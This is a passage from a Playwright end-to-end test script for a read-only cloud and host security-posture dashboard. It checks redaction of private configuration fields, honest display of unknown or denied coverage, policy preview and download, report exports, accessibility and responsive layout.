    return route.fulfill({ status: configurationMode === 'denied' ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/cloudflare/posture', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], operationSucceeded: !['denied','contradictory'].includes(configurationMode), data: { provider: 'cloudflare', resources: [], coverage: { state: configurationMode === 'denied' ? 'PermissionDenied' : configurationMode === 'contradictory' ? 'Complete' : 'Partial', enumeratedResources: 0 }, configurationEvidence: configurationMode === 'malformed' ? 'PRIVATE_MALFORMED_CONFIGURATION' : { source: 'PRIVATE_UNSUPPORTED_SOURCE', checks, arbitrary: 'PRIVATE_CONFIGURATION_FIELD' } } }) });
  });
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await page.locator('.ops-cloud-result-summary').innerText().then(text => !text.includes('PRIVATE_') && !text.includes('777') && !text.includes('888') && !text.includes('999')) && await page.locator('.ops-configuration-check').count() === 4, 'Configuration fields, unknown checks, identities, DNS content, WAF expressions and route patterns stay out of structured and projected JSON views');
  check(await configurationField('tls','Always use HTTPS').innerText() === 'Unknown' && await page.locator('.ops-configuration-check[data-check="waf"]').innerText().then(text => text.includes('Permission denied') && text.includes('values are unknown')) && await page.locator('.ops-configuration-check[data-check="routes"]').innerText().then(text => text.includes('Not requested') && text.includes('values are unknown')), 'Missing TLS booleans and unavailable WAF or unrequested routes never become disabled or zero observations');
  check(await page.locator('.ops-configuration-check[data-check="dns"] tbody tr').count() === 1 && await configurationField('dns','Observed proxied records').innerText() === '0' && await configurationField('dns','Observed DNS records').innerText() === '2', 'DNS presentation retains only approved record-type counts and genuine observed zero proxy counts');
  configurationMode = 'empty';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await configurationField('dns','Observed DNS records').innerText() === '0' && await page.locator('.ops-configuration-check[data-check="dns"] table').count() === 0 && !await page.locator('.ops-cloud-result-summary').innerText().then(text => text.includes('No resources observed in this successful query')), 'An observed empty DNS read remains a count of records without a secure-zone or complete-inventory claim');
  configurationMode = 'invalid';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await configurationField('tls','Observed SSL mode').innerText() === 'Unknown' && await configurationField('tls','Minimum TLS version').innerText() === 'Unknown' && await configurationField('tls','Always use HTTPS').innerText() === 'Unknown' && !await page.locator('.ops-cloud-result-summary').innerText().then(text => text.includes('PRIVATE_')), 'Unrecognized TLS modes, versions and non-boolean flags remain unknown and are omitted from projected JSON');
  configurationMode = 'future';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await page.locator('.ops-configuration-evidence .ops-cloud-status[data-state="complete"]').count() === 0 && await page.locator('.ops-configuration-check[data-check="tls"]').innerText().then(text => text.includes('values are unknown')), 'A future or invalid configuration timestamp cannot make stale values look like a complete observation');
  configurationMode = 'denied';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture', 502);
  check(await page.locator('.ops-configuration-evidence .ops-cloud-status[data-state="complete"]').count() === 0 && await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('Permission denied') && !text.includes('strict') && !text.includes('1.2')), 'An overall denied configuration read suppresses stale per-check values and success badges');
  configurationMode = 'contradictory';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await page.locator('.ops-cloud-result-summary .ops-cloud-status[data-state="complete"]').count() === 0 && await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('values are unknown') && !text.includes('strict') && !text.includes('1.2')), 'A failed operation cannot claim complete configuration observations through contradictory coverage metadata');
  configurationMode = 'malformed';
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('No supported configuration observations')) && !await page.locator('.ops-cloud-result-summary').innerText().then(text => text.includes('PRIVATE_')), 'Malformed scalar configuration evidence cannot bypass projection into the JSON view');
  await page.unroute(configurationPath);
  await page.locator('#cloud-provider').selectOption('alibaba');
  await invokeAdvancedFixture('alibaba-scope-1/posture', 'cloud/alibaba/posture');
  check(await configurationField('security-groups','Observed security groups').innerText() === '2' && await configurationField('security-groups','Observed administrative ingress allow rules').innerText() === '1' && await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('do not establish effective reachability')), 'Alibaba displays observed administrative-ingress configuration counts without asserting effective network access');
  const alibabaPath = '**/api/cloud/alibaba-scope-1/posture';
  await page.route(alibabaPath, route => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/alibaba/posture', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], data: { provider: 'alibaba', coverage: { state: 'Partial' }, configurationEvidence: { source: 'aliyun-fixed-projections', checks: [{ check: 'disks', state: 'partial', observedAtUtc: new Date().toISOString(), observations: { disksRead: 1, unencryptedDisks: 0, unknownEncryption: 1 } }, { check: 'security-groups', state: 'partial', observedAtUtc: new Date().toISOString(), observations: { groupsRead: 0, rulesRead: null, worldIngressAllowRules: -1, administrativeIngressAllowRules: '0', possiblyShadowedAdminAllowRules: 0, unknownRules: 3, sourceCidr: 'PRIVATE_CIDR', description: 'PRIVATE_RULE_DESCRIPTION' } }] } } }) }));
  await invokeAdvancedFixture('alibaba-scope-1/posture', 'cloud/alibaba/posture');
  check(await configurationField('disks','Observed unencrypted disks').innerText() === '0' && await configurationField('disks','Disks with unknown encryption').innerText() === '1' && await configurationField('security-groups','Observed rules').innerText() === 'Unknown' && await configurationField('security-groups','Observed global ingress allow rules').innerText() === 'Unknown' && await configurationField('security-groups','Observed administrative ingress allow rules').innerText() === 'Unknown' && !await page.locator('.ops-cloud-result-summary').innerText().then(text => text.includes('PRIVATE_')), 'Alibaba preserves known zeros and unknown encryption while rejecting missing, negative or string rule counts and private rule fields');
  await page.unroute(alibabaPath);
  await page.locator('#cloud-provider').selectOption('scaleway');
  check(await page.locator('.ops-cloud-card [data-operation="networks"]').count() === 1 && await page.getByRole('button').filter({ hasText: 'scaleway-scope-1/networks' }).count() === 1, 'Regional network actions require a registered configured descriptor');
  await invokeAdvancedFixture('scaleway-scope-1/networks', 'cloud/scaleway/networks');
  check(await configurationField('vpcs','Observed regional resources').innerText() === '2' && await configurationField('vpcs','Provider-declared resources').innerText() === '2', 'Scaleway regional network observations preserve observed and provider-declared counts separately');
  await page.locator('#language').selectOption('es');
  check(await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('Configuración observada') && text.includes('Recursos regionales observados') && text.includes('No demuestran accesibilidad efectiva')), 'Spanish configuration evidence explains the same scope and interpretation limits');
  await page.locator('#language').selectOption('en');
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Regional configuration evidence fits the mobile viewport');
  await page.screenshot({ path: path.join(results, 'configuration-mobile.png'), fullPage: true });
  await page.setViewportSize({ width: 1440, height: 1000 });
  const scalewayPath = '**/api/cloud/scaleway-scope-1/networks';
  await page.route(scalewayPath, route => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/scaleway/networks', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], data: { provider: 'scaleway', coverage: { state: 'Partial' }, configurationEvidence: { source: 'scaleway-vpc-v2', checks: [{ check: 'vpcs', state: 'permission_denied', observedAtUtc: new Date().toISOString(), observations: { observedResources: 55, expectedResources: 77 } }, { check: 'private-networks', state: 'complete', observedAtUtc: new Date().toISOString(), observations: { observedResources: 0, expectedResources: 0 } }] } } }) }));
  await invokeAdvancedFixture('scaleway-scope-1/networks', 'cloud/scaleway/networks');
  check(await page.locator('.ops-configuration-check[data-check="vpcs"]').innerText().then(text => text.includes('values are unknown') && !text.includes('55') && !text.includes('77')) && await configurationField('private-networks','Observed regional resources').innerText() === '0', 'An unavailable VPC read cannot reuse stale totals while a separate successful empty network read retains its actual zero');
  await page.unroute(scalewayPath);
  await page.locator('#cloud-provider').selectOption('azure');
  let deniedCoverage = false;
  await page.route('**/api/cloud/azure-scope-1/inventory', route => route.fulfill({ status: deniedCoverage ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/azure/inventory', collectedAtUtc: new Date().toISOString(), findings: [], data: { resources: [{ provider: 'azure', type: 'compute.vm', properties: { status: 'running' } }], coverage: { state: deniedCoverage ? 'PermissionDenied' : 'Partial', enumeratedResources: 1 } }, warnings: ['Synthetic limited coverage.'], operationSucceeded: !deniedCoverage }) }));
  const partialResponse = page.waitForResponse(response => response.url() === origin + '/api/cloud/azure-scope-1/inventory');
  await page.getByRole('button').filter({ hasText: 'azure-scope-1/inventory' }).click(); await partialResponse;
  check(await page.locator('.ops-cloud-result-summary>.ops-cloud-status[data-state="partial"]').count() === 1 && await page.locator('.ops-cloud-result-summary').textContent().then(text => text.includes('observed only; incomplete coverage')), 'Partial inventories label their count as observed evidence instead of complete coverage');
  deniedCoverage = true;
  const deniedResponse = page.waitForResponse(response => response.url() === origin + '/api/cloud/azure-scope-1/inventory');
  await page.getByRole('button').filter({ hasText: 'azure-scope-1/inventory' }).click(); await deniedResponse;
  check(await page.locator('.ops-cloud-result-summary>.ops-cloud-status[data-state="denied"]').count() === 1 && await page.locator('.ops-cloud-result-summary').textContent().then(text => text.includes('Unknown')), 'Permission-denied inventory presents an unknown resource count and its specific coverage failure');
  await page.unroute('**/api/cloud/azure-scope-1/inventory');
  await page.locator('[data-view="policy"]').click();
  check(await page.locator('#policy-editor').count() === 1 && await page.locator('#view').innerText().then(text => text.includes('never applies policy')), 'Policy editor clearly limits its behavior to preview and download');
  await page.locator('#policy-editor').fill('version: 2\n');
  await page.getByRole('button', { name: 'Validate & preview', exact: true }).click();
  await page.locator('#policy-result .notice').waitFor();
  check(await page.locator('#policy-download').isDisabled(), 'Invalid policy YAML shows validation errors and cannot be downloaded as validated');
  const policyDraft = 'version: 1\nthresholds:\n  cpuWarningPercent: 10\n  cpuCriticalPercent: 15\n';
  await page.locator('#policy-editor').fill(policyDraft);
  await page.getByRole('button', { name: 'Validate & preview', exact: true }).click();
  await page.getByRole('heading', { name: 'Policy validated', exact: true }).waitFor();
  check(await page.locator('#policy-result').innerText().then(text => text.includes('POLICY_CPU') && text.includes('CRITICAL')), 'Policy preview evaluates strict YAML thresholds against current collected evidence');
  const policyDownloadEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download validated YAML', exact: true }).click();
  const policyDownload = await policyDownloadEvent;
  fs.mkdirSync(results, { recursive: true });
  const policyPath = path.join(results, 'opscope.yml');
  await policyDownload.saveAs(policyPath);
  check(fs.readFileSync(policyPath, 'utf8') === policyDraft, 'Validated policy downloads the exact draft without applying host configuration');
  await page.locator('#policy-editor').fill(policyDraft + '# edited\n');
  check(await page.locator('#policy-download').isDisabled() && await page.locator('#policy-result').innerText().then(text => text.includes('Draft changed')), 'Editing a validated policy invalidates stale findings and download state');
  await page.locator('#policy-editor').focus();
  await page.waitForTimeout(5200);
  check(await page.locator('#policy-editor').evaluate(node => node === document.activeElement && node.value.endsWith('# edited\n')), 'Live evidence updates preserve an active policy draft and keyboard focus');
  await exerciseSavedEvidence(page, context, origin, token);
  await page.locator('[data-view="reports"]').click();
  const bundleEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download redacted bundle', exact: true }).click();
  const bundleDownload = await bundleEvent;
  const bundlePath = path.join(results, bundleDownload.suggestedFilename());
  await bundleDownload.saveAs(bundlePath);
  check(fs.readFileSync(bundlePath).subarray(0, 2).toString() === 'PK', 'Bundle button downloads the verified custody ZIP as its primary artifact');
  const checksumEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download bundle checksum', exact: true }).click();
  const checksumDownload = await checksumEvent;
  const checksumPath = path.join(results, checksumDownload.suggestedFilename());
  await checksumDownload.saveAs(checksumPath);
  check(fs.readFileSync(checksumPath, 'utf8').trim() === createHash('sha256').update(fs.readFileSync(bundlePath)).digest('hex'), 'Separate checksum download matches the ZIP without relying on automatic multiple downloads');
  const downloadEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download PDF', exact: true }).click();
  const downloaded = await downloadEvent;
  fs.mkdirSync(results, { recursive: true });
  const pdf = path.join(results, downloaded.suggestedFilename());
  await downloaded.saveAs(pdf);
  check(fs.readFileSync(pdf).subarray(0, 5).toString() === '%PDF-', 'Report export downloads an actual PDF document');
  const jsonEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download redacted JSON', exact: true }).click();
  const jsonDownload = await jsonEvent, jsonPath = path.join(results, jsonDownload.suggestedFilename());
  await jsonDownload.saveAs(jsonPath);
  check(!fs.readFileSync(jsonPath, 'utf8').includes('api-private-host'), 'Downloaded snapshot always uses shared redaction');
  await page.locator('[data-view="settings"]').click();
  check(await page.locator('#view').innerText().then(text => text.includes('127.0.0.1') && text.includes('telemetry')), 'Settings expose the actual read-only listener and telemetry configuration');
  const storage = await page.evaluate(() => ({ local: JSON.stringify(localStorage), session: JSON.stringify(sessionStorage) }));
  check(!storage.local.includes(token) && !storage.session.includes(token) && !storage.local.includes('api-private-host'), 'Browser storage contains no token or snapshot evidence');
  await page.locator('[data-view="overview"]').click();
  check(await page.locator('#navigation .nav-group').count() === 6 && await page.locator('#navigation [data-view]').count() === 13, 'Task groups preserve access to all thirteen evidence and connection sections');
  check(await page.evaluate(() => parseFloat(getComputedStyle(document.documentElement).fontSize) >= 16), 'The interface uses a readable sixteen-pixel base font');
  await page.locator('section.ops-chart').waitFor();
  check(await page.locator('section.ops-chart svg[role="img"]').count() === 1 && await page.locator('section.ops-chart details').count() === 1, 'Realtime host chart exposes a labelled visual and an alternative sample table');
  const chartWindow = page.locator('section.ops-chart select');
  await chartWindow.selectOption('5');
  check(await chartWindow.inputValue() === '5', 'Realtime chart window can be changed without replacing evidence');
  await page.locator('section.ops-chart button').filter({ hasText: /Pause/ }).click();
  check(await page.locator('section.ops-chart button').filter({ hasText: /Resume/ }).count() === 1, 'Realtime chart pause presents an explicit resumable state');
  await page.locator('section.ops-chart button').filter({ hasText: /Resume/ }).click();
  await page.screenshot({ path: path.join(results, 'overview-desktop.png'), fullPage: true });
  await page.evaluate(fs.readFileSync(require.resolve('axe-core/axe.min.js'), 'utf8'));
  const accessibility = await page.evaluate(async () => axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } }));
  fs.writeFileSync(path.join(results, 'accessibility.json'), JSON.stringify(accessibility.violations, null, 2));
  check(accessibility.violations.length === 0, 'Overview passes automated WCAG A/AA accessibility checks');
  await page.locator('#theme').click();
  await page.waitForTimeout(200); // Let the existing button background transition finish before contrast sampling.
  const darkAccessibility = await page.evaluate(async () => axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } }));
  fs.writeFileSync(path.join(results, 'accessibility-dark.json'), JSON.stringify(darkAccessibility.violations, null, 2));
  check(darkAccessibility.violations.length === 0, 'Dark theme also passes automated WCAG A/AA accessibility checks');
  await page.screenshot({ path: path.join(results, 'overview-dark.png'), fullPage: true });
  const emulation = await context.newCDPSession(page);
  await emulation.send('Emulation.setDeviceMetricsOverride', { width: 720, height: 500, deviceScaleFactor: 2, mobile: false });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1) && await page.locator('#navigation-toggle').isVisible() && await page.locator('#collect').isVisible(), 'A 1440px display at a 200-percent equivalent layout keeps collection and section controls available without horizontal overflow');
  await page.screenshot({ path: path.join(results, 'overview-zoom200.png'), fullPage: true });
  await emulation.send('Emulation.clearDeviceMetricsOverride'); await emulation.detach();
  for (const width of [320, 390, 720, 768, 1024, 1440, 1920]) {
    await page.setViewportSize({ width, height: 1000 });
    check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Overview fits the viewport without horizontal page scrolling at ' + width + 'px');
  }
  await page.setViewportSize({ width: 390, height: 844 });
  const menu = page.locator('#navigation-toggle');
  check(await menu.isVisible() && await menu.getAttribute('aria-expanded') === 'false' && await page.locator('#navigation').isHidden(), 'Mobile sections menu starts collapsed with an explicit accessible state');
  await menu.focus(); await page.keyboard.press('Enter');
  check(await menu.getAttribute('aria-expanded') === 'true' && await page.locator('#navigation').isVisible(), 'Keyboard activation exposes every mobile navigation group');
  await page.locator('#navigation [data-view="history"]').focus(); await page.keyboard.press('Escape');
  check(await menu.getAttribute('aria-expanded') === 'false' && await page.locator('#navigation').isHidden() && await menu.evaluate(node => node === document.activeElement), 'Escape closes the mobile menu and restores focus to its toggle');
  await menu.click(); await page.locator('#navigation [data-view="findings"]').click();
  check(await menu.getAttribute('aria-expanded') === 'false' && await page.locator('#navigation').isHidden(), 'Choosing a section closes the mobile menu');
  await menu.click(); await page.locator('#navigation [data-view="overview"]').click();
  await page.waitForFunction(() => { const text = document.querySelector('section.ops-chart svg text'), matrix = text?.getScreenCTM(); return matrix && parseFloat(getComputedStyle(text).fontSize) * Math.hypot(matrix.a, matrix.b) >= 11; });
  check(await page.locator('section.ops-chart svg').evaluate(svg => svg.viewBox.baseVal.width <= 390), 'Host chart axes retain readable text after resizing to a mobile viewport');
  await page.screenshot({ path: path.join(results, 'overview-mobile.png'), fullPage: true });
  check(errors.length === 0, 'Browser reports no JavaScript runtime errors');
  check(external.length === 0, 'All UI resources and evidence requests remain on the authenticated local origin');
  const guardedContext = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const guardedPage = await guardedContext.newPage();
  await guardedPage.route('**/api/cloud/catalog', async route => {
    const catalog = await (await route.fetch()).json();
    const gcp = catalog.providers.find(provider => provider.id === 'gcp');
    gcp.operations.find(operation => operation.name === 'scc').readOnly = false;
    catalog.actions.push({ actionKey: 'gcp-scope-1/delete', providerId: 'gcp', scopeAlias: 'gcp-scope-1', operation: 'delete', availability: 'configured', supported: true, readOnly: true });
    await route.fulfill({ json: catalog });
  });
  await guardedPage.goto(bootstrap);
  await guardedPage.getByRole('heading', { name: 'Host evidence', exact: true }).waitFor();
  await guardedPage.locator('[data-view="cloud"]').click();
  await guardedPage.locator('#cloud-provider').selectOption('gcp');
  check(await guardedPage.getByRole('button').filter({ hasText: 'gcp-scope-1/scc' }).count() === 0 && await guardedPage.getByRole('button').filter({ hasText: 'gcp-scope-1/delete' }).count() === 0 && await guardedPage.getByRole('button').filter({ hasText: 'gcp-scope-1/cost' }).count() === 1, 'Cloud actions require a known operation, matching capability and an explicit read-only descriptor');
  await guardedContext.close();
  await exerciseConnectionGuards(browser, bootstrap, origin, token);
  await exerciseCloudFreshnessAndRetry(browser, bootstrap, origin);
  await exerciseEstimatedMemory(browser, bootstrap);
  await exerciseProxyBootstrap(browser, origin, token);
  console.log(`PASS: ${assertions} browser and accessibility assertions.`);
}
main().catch(async error => { if (activePage) { try { fs.mkdirSync(results, { recursive: true }); await activePage.screenshot({ path: path.join(results, 'last-failure.png'), fullPage: true }); } catch {} } console.error(String(error).replace(/#token=\S+/g, '#token=[redacted]')); process.exitCode = 1; }).finally(async () => {
  if (browser) await browser.close();
  if (server && server.exitCode === null) { server.kill('SIGINT'); await Promise.race([new Promise(resolve => server.once('exit', resolve)), new Promise(resolve => setTimeout(resolve, 5000))]); if (server.exitCode === null) server.kill('SIGTERM'); }
});
